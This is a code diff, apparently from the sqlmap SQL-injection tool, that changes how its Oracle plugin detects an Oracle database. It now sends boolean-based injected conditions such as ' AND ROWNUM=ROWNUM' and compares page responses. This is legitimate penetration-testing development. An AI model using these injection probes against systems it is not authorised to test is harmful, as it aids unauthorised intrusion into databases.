@@ -26,6 +26,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 import re
 
+from lib.core.agent import agent
 from lib.core.common import formatDBMSfp
 from lib.core.common import formatFingerprint
 from lib.core.common import getHtmlErrorFp
@@ -38,6 +39,7 @@ from lib.core.settings import ORACLE_ALIASES
 from lib.core.settings import ORACLE_SYSTEM_DBS
 from lib.core.unescaper import unescaper
 from lib.request import inject
+from lib.request.connect import Connect as Request
 
 from plugins.generic.enumeration import Enumeration
 from plugins.generic.filesystem import Filesystem
@@ -163,17 +165,17 @@ class OracleMap(Fingerprint, Enumeration, Filesystem, Takeover):
         logMsg = "testing Oracle"
         logger.info(logMsg)
 
-        query = "LENGTH(SYSDATE)"
-        sysdate = inject.getValue(query)
+        payload = agent.fullPayload(" AND ROWNUM=ROWNUM")
+        result  = Request.queryPage(payload)
 
-        if sysdate and int(sysdate) > 0:
+        if result == True:
             logMsg = "confirming Oracle"
             logger.info(logMsg)
 
-            query = "SELECT SUBSTR((VERSION), 1, 2) FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1"
-            version = inject.getValue(query)
+            payload = agent.fullPayload(" AND LENGTH(SYSDATE)=LENGTH(SYSDATE)")
+            result  = Request.queryPage(payload)
 
-            if not version:
+            if result != True:
                 warnMsg = "the back-end DMBS is not Oracle"
                 logger.warn(warnMsg)
 
@@ -185,6 +187,9 @@ class OracleMap(Fingerprint, Enumeration, Filesystem, Takeover):
 
             if not conf.extensiveFp:
                 return True
+
+            query = "SELECT SUBSTR((VERSION), 1, 2) FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1"
+            version = inject.getValue(query)
 
             if re.search("^11", version):
                 kb.dbmsVersion = ["11i"]
